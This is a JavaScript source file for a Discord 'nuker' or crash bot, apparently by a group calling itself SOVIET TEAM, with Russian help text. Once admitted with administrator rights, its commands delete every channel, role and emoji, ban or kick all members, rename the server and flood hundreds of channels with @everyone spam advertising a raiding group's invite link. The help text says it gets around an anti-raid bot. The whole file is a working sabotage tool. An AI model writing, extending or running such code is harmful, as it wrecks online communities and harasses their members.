const Discord = require('discord.js');
const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright } = require('chalk');
const settings = require('./settings.json');
const token = settings.token;
const prefix = settings.prefix;
const founder = settings.founder;
const disableEveryone = settings.DisableEveryone;
const myID = settings.ID;

const presser = String.raw`

                                                   

 ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄    ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄   ▄▄ 
█       █       █  █ █  █   █       █       █  █       █       █       █  █▄█  █
█  ▄▄▄▄▄█   ▄   █  █▄█  █   █    ▄▄▄█▄     ▄█  █▄     ▄█    ▄▄▄█   ▄   █       █
█ █▄▄▄▄▄█  █ █  █       █   █   █▄▄▄  █   █      █   █ █   █▄▄▄█  █▄█  █       █
█▄▄▄▄▄  █  █▄█  █       █   █    ▄▄▄█ █   █      █   █ █    ▄▄▄█       █       █
 ▄▄▄▄▄█ █       ██     ██   █   █▄▄▄  █   █      █   █ █   █▄▄▄█   ▄   █ ██▄██ █
█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█ █▄▄▄█ █▄▄▄█▄▄▄▄▄▄▄█ █▄▄▄█      █▄▄▄█ █▄▄▄▄▄▄▄█▄▄█ █▄▄█▄█   █▄█
                                                            
                                                                      

                                        Автор: DIZZER

`;

console.log(red(presser));


client.on("ready", () => {
    console.log(blue('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log(redBright(`                                      Имя бота: ${client.user.username}#${client.user.discriminator}`));
    console.log(redBright(`                                      Префикс: ${prefix}`));
    console.log(redBright(`                                      Запретить всем использовать бота?: ${disableEveryone}`));
    console.log(redBright(`                                      Права ссылки по умолчанию: ADMINISTRATOR`));
    console.log(blue('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log("");
    client.user.setActivity({ type: "PLAYING", name: "Поёт гимн!" }); // Ага
});


client.on("message", async message => {

    if (message.author.bot) return;

    if (message.mentions.everyone === true) {
        return;
    } else if (message.mentions.has(client.user.id)) {
        const helpEmbed = new Discord.MessageEmbed()
            .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
            .setTitle('Made in USSR')
            .setDescription(`*БОЛЬШЕ НЕ ПИНГУЙ МЕНЯ! Чтоб узнать список команд напиши в чат +help*`)
            .setColor(0xff0000)
            .setTimestamp(Date.now());
        message.channel.send(helpEmbed);
    }

    // Test Command
  if (message.content === '+ping') {  
    message.channel.send(`🏓Задержка ${Date.now() - message.createdTimestamp}ms. API задержка ${Math.round(client.ws.ping)}ms`);
  }

    // Help

    if (disableEveryone === false) {

        if (message.content.startsWith(prefix + 'help')) {
            const helpEmbed = new Discord.MessageEmbed()
                .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
                .setTitle('Made in USSR')
                .setDescription(`*Панель управления ядерной бомбы.*\n\n **ПОСОБИЕ ПО УПРАВЛЕНИЮ ДЛЯ ЧАЙНИКОВ:**\n
                **Массовое Создание Каналов  (обход лавана):** \`${prefix}cc\` [text]
                **Массовое Создание Каналов и Спам  (обход лавана):** \`${prefix}mp\` [text]
                **Массовое Создание Ролей:** \`${prefix}mr\` [text]
                **Удалить Все Каналы:** \`${prefix}chd\`
                **Удалить Все Роли:** \`${prefix}dr\`
                **Удалить Все Эмодзи:** \`${prefix}emoall\`
                **Забанить ВСЕХ людей:** \`${prefix}banall\`
                **Кикнуть ВСЕХ людей  (обход лавана):** \`${prefix}kall\`
                **Автоматически удалить всё на сервере:** \`${prefix}boom\` [text]
                **Осторожно! Lavan забирает права у бота на 5 миунт. Перед крашем подождите пожалуйста 5 минут!**
                `)
                .setThumbnail(`https://cdn.discordapp.com/attachments/943611345390153818/944138310920601620/tild6637-3535-4238-b365-613432626161__giphy_1.gif`)
                .setFooter(`© SOVIET TEAM | Prefix: ${prefix} | Автор: SOVIET TEAM`)
                .setColor(0xff0000)
                .setTimestamp(Date.now());
            message.channel.send(helpEmbed);
            message.delete();
        }

        // Массовое Создание Каналовs      

        if (message.content.startsWith(prefix + 'cc')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                if (!argresult) {
                    message.channel.send("*Добавьте текст после данной команды!*")
                } else {
                    for (var i = 0; i < 250; i++) {
                        message.guild.channels.create(argresult)
                        console.log(yellowBright(`CHANNEL MASSED!`))
                    }
                }
                message.delete();
            }
        }

        // Массовое Создание Каналов & Ping Every Channel

        if (message.content.startsWith(prefix + 'mp')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                // If you dont give an input
                if (!argresult) {
                    for (var i = 0; i < 250; i++) {
                        message.guild.channels.create('Разработчик Бота: ' + message.author.username)

                        for (var i = 0; i < 250; i++) {
                            let channels = message.guild.channels.create('Разработчик Бота: ' + message.author.username)

                            channels.then(
                                function (channel, index) {
                                    for (var i = 0; i < 250; i++) {
                                        channel.send('@everyone Хочешь так же? Заходи на сервер! Лучшая краш группировка!: https://discord.gg/MeUuRqSwP8 ' + argresult)
                                        console.log(blueBright(`CHANNEL PINGED!`));
                                        // other per-channnel logic
                                    }
                                }
                            );
                        }

                    }

                }
                // If you give an input
                for (var i = 0; i < 250; i++) {
                    let channels = message.guild.channels.create(argresult)

                    channels.then(
                        function (channel, index) {
                            for (var i = 0; i < 250; i++) {
                                channel.send('@everyone Хочешь так же? Заходи на сервер! Лучшая краш группировка!: https://discord.gg/MeUuRqSwP8 ' + argresult);
                                console.log(blueBright(`CHANNEL PINGED!`));
                                // other per-channnel logic
                            }
                        }
                    );
                }
            }
            message.delete();
        }


        // Массовое Создание Ролей

        if (message.content.startsWith(prefix + 'mr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                if (!argresult) {
                    message.channel.send("*Добавьте текст после данной команды!*")
                } else {
                    setInterval(function () {
                        var i = 0; i < 250;
                        message.guild.roles.create({
                            data: {
                                name: `${argresult}`,
                                position: i++,
                                color: "RANDOM"
                            }
                        }).then(console.log(yellow("ROLE BEING MASSED")))
                    }, 100) // 0.1 second
                }
                message.delete();
            }
        }

        // Channel Delete
        if (message.content.startsWith(prefix + 'chd')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.guild.channels.cache.forEach(channel => channel.delete().then(
                    console.log(redBright(`CHANNEL FUCKED`))
                )); // deletes all channels
                message.delete();
            }
        }

        // Ban All
        if (message.content.startsWith(prefix + 'banall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.guild.members.cache.forEach(member => member.ban({ reason: "SOVIET BOMB." })
                    .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Начинаю всех банить.")
                        .catch()
                    ))
                message.delete();
            }
        }

        // Kick All
        if (message.content.startsWith(prefix + 'kall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.guild.members.cache.forEach(member => member.kick({ reason: "SOVIET BOMB." })
                    .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Начинаю всех банить.")
                        .catch()
                    ));
                message.delete();
            }
        }

        // Удалить Все Роли                 
        if (message.content.startsWith(prefix + 'dr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.guild.roles.cache.forEach((role) => {
                    role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
                })
                message.delete();
            }
        }

        // Удалить Все Эмодзи 
        if (message.content.startsWith(prefix + 'emoall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" }).then(console.log(yellow(`EMOJI: ${e.name} is being deleted successfully`))))
                message.delete();
            }
        }

        // Death.
        if (message.content.startsWith(prefix + 'boom')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.delete();
                message.guild.setName(`РАЗРАБОТЧИК БОТА SOVIET TEAM#7777`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name

                // Channel Delete
                message.guild.channels.cache.forEach(channel => channel.delete().then(
                    console.log(redBright(`CHANNEL FUCKED`))
                ).then(
                    // Channel Icon Change
                    message.guild.setIcon('https://cdn.discordapp.com/attachments/943808968659189811/944139951942041630/communism-sickle.gif') // changes server pfp
                ));

                // Roles
                message.guild.roles.cache.forEach((role) => {
                    if (!role.editable) {
                        return;
                    } else {
                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
                    }
                })

                // Emoji
                message.guild.emojis.cache.forEach(e => e.delete({ reason: "СОЗДАТЕЛЬ ТУПОЕ БРЕВНО!" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))

                // Massing Channels
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');

                if (!argresult) {
                    message.channel.send("*Добавьте текст после данной команды!*")
                } else {

                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)

                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send(`@everyone Хочешь так же? Заходи на сервер! Лучшая краш группировка!: https://discord.gg/MeUuRqSwP8 ${argresult}`)
                                    console.log(blueBright(`CHANNEL PINGED!`));
                                    // other per-channnel logic
                                }
                            }
                        )
                    }
                }
                setInterval(function () {
                    var i = 0; i < 250;
                    message.guild.roles.create({
                        data: {
                            name: `${argresult}`,
                            position: i++,
                            color: "RANDOM"
                        }
                    }).then(console.log(yellow("ROLE BEING MASSED")))
                }, 10) // 0.1 second
            }
        }

        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    } else if (disableEveryone === true) {

        if (message.content.startsWith(prefix + 'help')) {
            if (message.author.id != myID) {
                return message.reply('Доступ запрещён!.')
            }
            else {
                const helpEmbed = new Discord.MessageEmbed()
                    .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
                    .setTitle('Краш: Помощь')
                    .setDescription(`*По какой-то причине вы меня вызвали, сделайте это без сожалений.*\n\n **КРАШ!:**\n
                    **Массовое Создание Каналов:** \`${prefix}cc\` [text]
                    **Массовое Создание Каналов & Ping Stresser:** \`${prefix}mp\` [text]
                    **Массовое Создание Ролей:** \`${prefix}mr\` [text]
                    **Удалить Все Каналы:** \`${prefix}chd\`
                    **Удалить Все Роли:** \`${prefix}dr\`
                    **Удалить Все Эмодзи:** \`${prefix}emoall\`
                    **Забанить ВСЕХ людей:** \`${prefix}banall\`
                    **Кикнуть ВСЕХ людей:** \`${prefix}kall\`
                    **Автоматически удалить всё на сервере:** \`${prefix}boom\` [text]
                    **ОБРАТИТЕ ВНИМАНИЕ! Если на сервере Lavan, то он забирает права админа на 5 минут по пробуйте вернуть обратно права боту или подождите 5 минут!**
                    `)
                    .setThumbnail(`https://media.discordapp.net/attachments/864894125660307496/867484455341522960/200.gif`)
                    .setFooter(`© SOVIET TEAM | Prefix: ${prefix} | Автор: SOVIET TEAM`)
                    .setColor(0x36393E)
                    .setTimestamp(Date.now());
                message.channel.send(helpEmbed);
            }
        }

        // Массовое Создание Каналовs      

        if (message.content.startsWith(prefix + 'cc')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Доступ запрещён!.')
                }
                else {
                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
                    if (!argresult) {
                        message.channel.send("*Добавьте текст после данной команды!*")
                    } else {
                        for (var i = 0; i < 250; i++) {
                            message.guild.channels.create(argresult)
                            console.log(yellowBright(`CHANNEL MASSED!`))
                        }
                    }
                }
            }
        }

        // Массовое Создание Каналов & Ping Every Channel

        if (message.content.startsWith(prefix + 'mp')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Доступ запрещён!.')
                }
                else {
                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
                    // If you dont give an input
                    if (!argresult) {
                        for (var i = 0; i < 250; i++) {
                            message.guild.channels.create('Разработчик Бота: ' + message.author.username)

                            for (var i = 0; i < 250; i++) {
                                let channels = message.guild.channels.create('Разработчик Бота: ' + message.author.username)

                                channels.then(
                                    function (channel, index) {
                                        for (var i = 0; i < 250; i++) {
                                            channel.send('@everyone Хочешь так же? Заходи на сервер! Лучшая краш группировка!: https://discord.gg/MeUuRqSwP8 ' + argresult)
                                            console.log(blueBright(`CHANNEL PINGED!`));
                                            // other per-channnel logic
                                        }
                                    }
                                );
                            }

                        }

                    }
                    // If you give an input
                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)

                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send('@everyone Хочешь так же? Заходи на сервер! Лучшая краш группировка!: https://discord.gg/MeUuRqSwP8 ' + argresult);
                                    console.log(blueBright(`CHANNEL PINGED!`));
                                    // other per-channnel logic
                                }
                            }
                        );
                    }
                }
            }
        }
        // Mass Create Roles      

        if (message.content.startsWith(prefix + 'mr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Доступ запрещён!.')
                }
                else {
                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
                    if (!argresult) {
                        message.channel.send("*Добавьте текст после данной команды!*")
                    } else {
                        setInterval(function () {
                            var i = 0; i < 250;
                            message.guild.roles.create({
                                data: {
                                    name: `${argresult}`,
                                    position: i++,
                                    color: "RANDOM"
                                }
                            }).then(console.log(yellow("ROLE BEING MASSED")))
                        }, 10) // 0.1 second
                    }
                }
            }
        }

        if (message.content.startsWith(prefix + 'chd')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Доступ запрещён!.')
                }
                else {
                    message.guild.channels.cache.forEach(channel => channel.delete().then(
                        console.log(redBright(`CHANNEL FUCKED`))
                    )); // deletes all channels
                    message.delete();
                }
            }
        }

        // Ban All
        if (message.content.startsWith(prefix + 'banall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Доступ запрещён!.')
                }
                else {
                    message.guild.members.cache.forEach(member => member.ban({ reason: "Nuking." })
                        .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                            .catch()
                        ))
                }
            }
        }

        // Kick All
        if (message.content.startsWith(prefix + 'kall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Доступ запрещён!.')
                }
                else {
                    message.guild.members.cache.forEach(member => member.kick({ reason: "Nuking." })
                        .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                            .catch()
                        ));
                }
            }
        }

        // Удалить Все Роли All
        if (message.content.startsWith(prefix + 'dr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Доступ запрещён!.')
                }
                else {
                    message.guild.roles.cache.forEach(r => r.delete({ reason: "Nuking" }).then(console.log(yellow(`ROLE: ${r.name} was deleted successfully`))).catch(
                        console.log(yellow(`ROLE: ${r.name} was cannot be deleted.`))
                    ));
                }
            }
        }

        // Удалить Все Эмодзи All
        if (message.content.startsWith(prefix + 'emoall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Доступ запрещён!.')
                }
                else {
                    message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" }).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))).catch(
                        console.log(yellow(`EMOJI: ${r.name} was cannot be deleted.`))
                    ));
                }
            }
        }
    }

    // Death.
    if (message.content.startsWith(prefix + 'boom')) {
        if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
            return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
        } else {
            if (message.author.id != myID) {
                return message.reply('Доступ запрещён!.')
            }
            else {
                message.delete();
                message.guild.setName(`Смерть рядом))).`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name

                // Channel Delete
                message.guild.channels.cache.forEach(channel => channel.delete().then(
                    console.log(redBright(`CHANNEL FUCKED`))
                ).then(
                    // Channel Icon Change
                    message.guild.setIcon('https://cdn.discordapp.com/attachments/943808968659189811/944139951942041630/communism-sickle.gif') // changes server pfp
                ));

                // Roles
                message.guild.roles.cache.forEach((role) => {
                    if (!role.editable) {
                        return;
                    } else {
                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
                    }
                })

                // Emoji
                message.guild.emojis.cache.forEach(e => e.delete({ reason: "СОЗДАТЕЛЬ ТУПОЕ БРЕВНО!" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))

                // Massing Channels
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');

                if (!argresult) {
                    message.channel.send("*Добавьте текст после данной команды!*")
                } else {

                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)

                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send(`@everyone Хочешь так же? Заходи на сервер! Лучшая краш группировка!: https://discord.gg/MeUuRqSwP8 ${argresult}`)
                                    console.log(blueBright(`CHANNEL PINGED!`));
                                    // other per-channnel logic
                                }
                            }
                        )
                    }
                }
                setInterval(function () {
                    var i = 0; i < 250;
                    message.guild.roles.create({
                        data: {
                            name: `${argresult}`,
                            position: i++,
                            color: "RANDOM"
                        }
                    }).then(console.log(yellow("ROLE BEING MASSED")))
                }, 10) // 0.1 second
            }
        }
    }

})

client.login(token);